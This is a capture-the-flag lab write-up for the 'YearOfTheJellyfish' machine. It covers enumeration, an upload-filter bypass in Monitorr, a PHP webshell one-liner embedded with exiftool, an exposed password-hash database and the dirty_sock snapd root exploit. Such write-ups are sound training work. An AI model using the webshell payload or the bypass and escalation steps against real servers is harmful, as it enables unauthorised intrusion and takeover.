# YearOfTheJellyfish

## Let's start enumerating

First as always i ran `nmap` to check for open ports:

```
# Nmap 7.91 scan initiated Sat Apr 24 12:30:03 2021 as: nmap -sC -sV -oN nmapScan.txt <MACHINE_IP>
Nmap scan report for ec2-<MACHINE_IP>.eu-west-1.compute.amazonaws.com (<MACHINE_IP>)
Host is up (0.043s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)
80/tcp   open  http     Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to https://robyns-petshop.thm/
443/tcp  open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Robyn&#039;s Pet Shop
| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
| Not valid before: 2021-04-24T16:24:05
|_Not valid after:  2022-04-24T16:24:05
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
8000/tcp open  http-alt
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 15
|_    Request
|_http-title: Under Development!
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.91%I=7%D=4/24%Time=608447AD%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,3F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x2
SF:015\r\n\r\n400\x20Bad\x20Request");
Service Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 24 12:30:55 2021 -- 1 IP address (1 host up) scanned in 52.25 seconds
```

I had to add https://robyns-petshop.thm/ to my hosts file to be able to access the website in the ports 80 and 443. Looks like `ssh` and `ftp` are open and also there is an under development page in the port 8000. This last page shows this message:

```
Under Construction
This site is under development. Please be patient.

If you have been given a specific ID to use when accessing this development site, please put it at the end of the url (e.g. <MACHINE_IP>:8000/ID_HERE)
```

So i guess we should look for that id somewhere. Before starting to throw `gobuster` or `nikto` to the pages i wanted to check the `ftp` service but looks like no anonymous login allowed. I tried `gobuster` in the main page (The other page always returned 200):

```
gobuster dir -k -u https://robyns-petshop.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://robyns-petshop.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/04/24 12:50:26 Starting gobuster
===============================================================
/content (Status: 301)
/themes (Status: 301)
/business (Status: 401)
/assets (Status: 301)
/plugins (Status: 301)
/vendor (Status: 301)
/config (Status: 301)
/LICENSE (Status: 200)
/server-status (Status: 403)
===============================================================
2021/04/24 12:53:49 Finished
===============================================================
```

The `business` page ask for user and password... interesting. Looks like the page is using https://github.com/picocms/Pico/tree/v2.1.4, interesting but nothing usefull let's check `nikto`:

```
nikto -h https://robyns-petshop.thm

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          <MACHINE_IP>
+ Target Hostname:    robyns-petshop.thm
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=GB/ST=South West/L=Bristol/O=Robyns Petshop/CN=robyns-petshop.thm/emailAddress=robyn@robyns-petshop.thm
                   Ciphers:  TLS_AES_256_GCM_SHA384
                   Issuer:   /C=GB/ST=South West/L=Bristol/O=Robyns Petshop/CN=robyns-petshop.thm/emailAddress=robyn@robyns-petshop.thm
+ Start Time:         2021-04-24 13:01:51 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /config/: Directory indexing found.
+ /config/: Configuration information may be available remotely.
+ OSVDB-3233: /icons/README: Apache default file found.
```

### New domains

After crying a bit a found something (Why i dont check SSL certificates before?), `sslscan` report this for the main page:

```
sslscan https://robyns-petshop.thm/

Version: 2.0.8-static
OpenSSL 1.1.1k-dev  xx XXX xxxx

Connected to <MACHINE_IP>

Testing SSL server robyns-petshop.thm on port 443 using SNI name robyns-petshop.thm

  SSL/TLS Protocols:
SSLv2     disabled
SSLv3     disabled
TLSv1.0   enabled
TLSv1.1   enabled
TLSv1.2   enabled
TLSv1.3   enabled

  TLS Fallback SCSV:
Server supports TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
Compression disabled

  Heartbleed:
TLSv1.3 not vulnerable to heartbleed
TLSv1.2 not vulnerable to heartbleed
TLSv1.1 not vulnerable to heartbleed
TLSv1.0 not vulnerable to heartbleed

  Supported Server Cipher(s):
Preferred TLSv1.3  128 bits  TLS_AES_128_GCM_SHA256        Curve 25519 DHE 253
Accepted  TLSv1.3  256 bits  TLS_AES_256_GCM_SHA384        Curve 25519 DHE 253
Accepted  TLSv1.3  256 bits  TLS_CHACHA20_POLY1305_SHA256  Curve 25519 DHE 253
Preferred TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve 25519 DHE 253
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-GCM-SHA384     DHE 2048 bits
Accepted  TLSv1.2  256 bits  ECDHE-RSA-CHACHA20-POLY1305   Curve 25519 DHE 253
Accepted  TLSv1.2  256 bits  DHE-RSA-CHACHA20-POLY1305     DHE 2048 bits
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-CCM8           DHE 2048 bits
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-CCM            DHE 2048 bits
Accepted  TLSv1.2  256 bits  ECDHE-ARIA256-GCM-SHA384      Curve 25519 DHE 253
Accepted  TLSv1.2  256 bits  DHE-RSA-ARIA256-GCM-SHA384    DHE 2048 bits
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve 25519 DHE 253
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-GCM-SHA256     DHE 2048 bits
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-CCM8           DHE 2048 bits
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-CCM            DHE 2048 bits
Accepted  TLSv1.2  128 bits  ECDHE-ARIA128-GCM-SHA256      Curve 25519 DHE 253
Accepted  TLSv1.2  128 bits  DHE-RSA-ARIA128-GCM-SHA256    DHE 2048 bits
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA384       Curve 25519 DHE 253
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA256         DHE 2048 bits
Accepted  TLSv1.2  256 bits  ECDHE-RSA-CAMELLIA256-SHA384  Curve 25519 DHE 253
Accepted  TLSv1.2  256 bits  DHE-RSA-CAMELLIA256-SHA256    DHE 2048 bits
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA256       Curve 25519 DHE 253
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-SHA256         DHE 2048 bits
Accepted  TLSv1.2  128 bits  ECDHE-RSA-CAMELLIA128-SHA256  Curve 25519 DHE 253
Accepted  TLSv1.2  128 bits  DHE-RSA-CAMELLIA128-SHA256    DHE 2048 bits
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve 25519 DHE 253
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits
Accepted  TLSv1.2  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 2048 bits
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve 25519 DHE 253
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-SHA            DHE 2048 bits
Accepted  TLSv1.2  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 2048 bits
Accepted  TLSv1.2  256 bits  AES256-GCM-SHA384            
Accepted  TLSv1.2  256 bits  AES256-CCM8                  
Accepted  TLSv1.2  256 bits  AES256-CCM                   
Accepted  TLSv1.2  256 bits  ARIA256-GCM-SHA384           
Accepted  TLSv1.2  128 bits  AES128-GCM-SHA256            
Accepted  TLSv1.2  128 bits  AES128-CCM8                  
Accepted  TLSv1.2  128 bits  AES128-CCM                   
Accepted  TLSv1.2  128 bits  ARIA128-GCM-SHA256           
Accepted  TLSv1.2  256 bits  AES256-SHA256                
Accepted  TLSv1.2  256 bits  CAMELLIA256-SHA256           
Accepted  TLSv1.2  128 bits  AES128-SHA256                
Accepted  TLSv1.2  128 bits  CAMELLIA128-SHA256           
Accepted  TLSv1.2  256 bits  AES256-SHA                   
Accepted  TLSv1.2  256 bits  CAMELLIA256-SHA              
Accepted  TLSv1.2  128 bits  AES128-SHA                   
Accepted  TLSv1.2  128 bits  CAMELLIA128-SHA              
Preferred TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve 25519 DHE 253
Accepted  TLSv1.1  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits
Accepted  TLSv1.1  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 2048 bits
Accepted  TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve 25519 DHE 253
Accepted  TLSv1.1  128 bits  DHE-RSA-AES128-SHA            DHE 2048 bits
Accepted  TLSv1.1  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 2048 bits
Accepted  TLSv1.1  256 bits  AES256-SHA                   
Accepted  TLSv1.1  256 bits  CAMELLIA256-SHA              
Accepted  TLSv1.1  128 bits  AES128-SHA                   
Accepted  TLSv1.1  128 bits  CAMELLIA128-SHA              
Preferred TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve 25519 DHE 253
Accepted  TLSv1.0  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits
Accepted  TLSv1.0  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 2048 bits
Accepted  TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve 25519 DHE 253
Accepted  TLSv1.0  128 bits  DHE-RSA-AES128-SHA            DHE 2048 bits
Accepted  TLSv1.0  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 2048 bits
Accepted  TLSv1.0  256 bits  AES256-SHA                   
Accepted  TLSv1.0  256 bits  CAMELLIA256-SHA              
Accepted  TLSv1.0  128 bits  AES128-SHA                   
Accepted  TLSv1.0  128 bits  CAMELLIA128-SHA              

  Server Key Exchange Group(s):
TLSv1.3  128 bits  secp256r1 (NIST P-256)
TLSv1.3  192 bits  secp384r1 (NIST P-384)
TLSv1.3  260 bits  secp521r1 (NIST P-521)
TLSv1.3  128 bits  x25519
TLSv1.3  224 bits  x448
TLSv1.2  128 bits  secp256r1 (NIST P-256)
TLSv1.2  192 bits  secp384r1 (NIST P-384)
TLSv1.2  260 bits  secp521r1 (NIST P-521)
TLSv1.2  128 bits  x25519
TLSv1.2  224 bits  x448

  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048

Subject:  robyns-petshop.thm
Altnames: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
Issuer:   robyns-petshop.thm

Not valid before: Apr 24 16:24:05 2021 GMT
Not valid after:  Apr 24 16:24:05 2022 GMT
```

Some new domains to check: robyns-petshop.thm, monitorr.robyns-petshop.thm, beta.robyns-petshop.thm, dev.robyns-petshop.thm

#### beta.robyns-petshop.thm

So this is the under development page we saw before. Using `gobuster` and `nikto` was useless because the page always return the code 200.

Is asking for a ID i don't have sooo lets see the next page.

#### dev.robyns-petshop.thm

Looks like is a another version of the main page (dev subdomain you know). `gobuster` returned:

```
gobuster dir -k -u https://dev.robyns-petshop.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://dev.robyns-petshop.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/04/24 13:56:09 Starting gobuster
===============================================================
/content (Status: 301)
/themes (Status: 301)
/business (Status: 401)
/assets (Status: 301)
/plugins (Status: 301)
/vendor (Status: 301)
/config (Status: 301)
/LICENSE (Status: 200)
/server-status (Status: 403)
===============================================================
2021/04/24 13:57:16 Finished
===============================================================
```

No luck here, after trying also with `nikto` looks exactly as the main page. Also i tried to check for txt, php, json and yaml files with `gobuster` but no luck

#### monitorr.robyns-petshop.thm

Like the subdomain says is a monitor and looks like there is another page (Jellyfin) apart from the PetShop being monitored in the port 8096, i will look at it in a moment. The monitor that is being used is this one: https://github.com/Monitorr/Monitorr. Here is what `gobuster` returned:

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://monitorr.robyns-petshop.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/04/24 14:04:21 Starting gobuster
===============================================================
/data (Status: 301)
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2021/04/24 12:53:49 Finished
===============================================================
```

In https://monitorr.robyns-petshop.thm/settings.php i noticed a text that said:

```
User database dir: /var/www/monitorr/data
User database file: /var/www/monitorr/datausers.db
```
So... At this point i was kind of lucky because i though, if that `data` folder is the same reported by `gobuster` i guess i can just https://monitorr.robyns-petshop.thm/datausers.db right? And yep i got the users database yey. So now i guess i can try to get the hash cracked?
```
1	admin	$2y$10$q1BI3CSqToALH2Q1r2weLeRpyU7QbonizeVxJnPIieo/drbRSzVTa
```

Also checking https://monitorr.robyns-petshop.thm/assets/config/_installation/mkdbajax.php i saw that i can recreate the database and with https://monitorr.robyns-petshop.thm/assets/config/_installation/mkdirajax.php i can recreate the database and also the config files where i want them to be. I also learned that i can destroy the hole application if im not carefull with this lol.

#### http://MACHINE_IP:8096

So, here we have a Jellyfin application running. I tried the forgot my password option but only can be done if im in the same network, this is the petition that the form is sending by the way:

```
return ApiClient.ajax({
    type: "POST",
    url: ApiClient.getUrl("Users/ForgotPassword"),
    dataType: "json",
    contentType: "application/json",
    data: JSON.stringify({
      EnteredUsername: e.querySelector("#txtName").value
    })
  }).then(s), t.preventDefault(), !1
}
```

I also noticed that the browser console in this page was printing a lot of information (Maybe debug mode?) and i found this `JSON credentials` thing in the console:

```
Stored JSON credentials: {"Servers":[{"DateLastAccessed":1619375869109,"LastConnectionMode":2,"ManualAddress":"http://<MACHINE_IP>:8096","manualAddressOnly":true,"Name":"petshop","Id":"b6c698509b83439992b3e437c87f7fb5","LocalAddress":"http://<LOCAL_MACHINE_IP>:8096"}]}
```

I can see the local address of the machine (THM VPN) and some ids that don't work in the beta site, sad.

### Wait a minute... RCE?

To be honest i spent hours trying to figure what to do next and trying to get something of the databases in  https://monitorr.robyns-petshop.thm. I went to sleep and when i woke up i checked the monitorr repo again. I saw an `upload.php` file in the `assets/php` folder... Wait... Is that in the box? How could i have missed it? So yeah... i checked and in fact it was there, im stupid and i had tunnel vision with the databases en data directories.

So i looked through the `upload.php` code in the github repo and looks like the validation is done using `getimagesize` what is exploitable good. I started up `postman` and started trying to `POST` an image (the parameter for the file to upload is called `fileToUpload` by the way) and what i got? "You are an exploit." WAIT WHAT? No this wasn't a bad thing, was just a beach image wtf. But i saw the problem more or less quick, i needed to add to `postman` the cookie `isHuman` with the value 1.

After configuring `postman` with the cookie i was able to update my image. I noticed that this file wasn't exactly the same as the one i saw in GitHub because it was checking the extensions too and also was checking for the substring `php` anywhere in the filename. After some digging i got an image called `example.jpg.phtml` through the filter. I tried to upload a `php` file named that way but no luck, probably is using the `getimagesize` function too but i think i can bypass that too.

Using `exiftool` i added a payload as metadata to a normal image (Ty Ironhackers for the cheatsheet):
```
exiftool -Comment="<?php echo '<form action=\''.\$PHP_SELF.'\' method=\'post\'>Command:<input type=\'text\' name=\'cmd\'><input type=\'submit\'></form>'; if(\$_POST){system(\$_POST['cmd']);} __halt_compiler();" example.jpg
```
After that i renamed the image `example.jpg` to `example.jpg.phtml` and uploaded it. The file passed through the filer and when i checked the `assets/data/usrimg/` folder and clicked on it there it was, my little form to send commands. RCE YEYYYY.

### flag1.txt

Before trying to get a shell i got the first flag using: `cat ../../../../flag1.txt`

```
THM{**************************}
```

### Reverse shell... kind of

After some time trying to get a reverse shell i couldn't get it working so a used this: https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php. Is a shell in the browser so at least is easier to explore the machine while a guess why i can't get a reverse shell on my site.

I found that the `at` command could be a privesc vector but `www-data` can't use it

`cat /etc/apache2/htpasswd` contains the credentials for the business page in the dev and main page: `robyn:$apr1$tMFlj08b$5VCOhI2see0L0WRU8Mn.b.`

### Shell from HTTP

So i got and idea and looks like im not the first with this problem. Looks like the shells are not comming back because some kind of firewall (more about this at the end) so i will need to use the webshell to spawn a full `pty`.

- First i will use the RCE i got to upload or generate a `cmd.php` page that will work with `GET` requests
- I will use the `tty-from-php-python.py` program. I got from [here](https://s4vitar.github.io/ttyoverhttp/#) and modified some parts. I know is a spanish site but im spanish, just go to the end of the article que check the code.
- Once the program is executed first run: `script /dev/null -c bash` and got a pty (Thanks god)


### Enumerate, enumerate...

I mainly used `linpeas.sh` for this along side some manual enumeration. Here i wrote some of the stuff that had promising versions to search for exploits:

```
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.5 LTS
Release:        18.04
Codename:       bionic

Sudo version 1.8.21p2
Linux kernel 4.15.0-140-generic
ldd (Ubuntu GLIBC 2.27-3ubuntu1.4) 2.27

snap    2.32.5+18.04
snapd   2.32.5+18.04 <---- https://www.exploit-db.com/exploits/46362
```
The snapd version ended up being the key. Using my php `pty` thing i executed the script and...

```
      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/lznnxqwpco;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...



********************
Success! You can now `su` to the following account and use sudo:
   username: dirty_sock
   password: dirty_sock
********************

```

It worked! (Actually, looks like sometimes the exploit reports an error, don't worry, if the target is vulnerable the account is created anyway) I just used `su dirty_sock` with `dirty_sock` as the password and then `sudo su`:
```
root@petshop:/var/www/monitorr/assets/data/usrimg#
```
Omg that was a long one, the flag was in the `root` directory as usual:

```
root@petshop:/var/www/monitorr/assets/data/usrimg# cd /root
root@petshop:~# ls
root.txt  snap
root@petshop:~# cat root.txt
THM{**************************}
```

## Last thing

After getting root access i tried some things and i got a proper reverse shell, a bit late but hey at least i got it. The problem was an egress firewall, i just had to put netcat to listen in the 443 port (Remember to use your THM VPN IP to connect from the target machine to yours).

I have to say that im pretty stuppid because in part i knew i could use `curl` and `wget` to get for example `google.com`but i think i just got obsess with the box and wasn't really thinking clearly. At least i got a new tool, not perfect but works. Also i should use `searchexploit` more, can be faster than `google`.
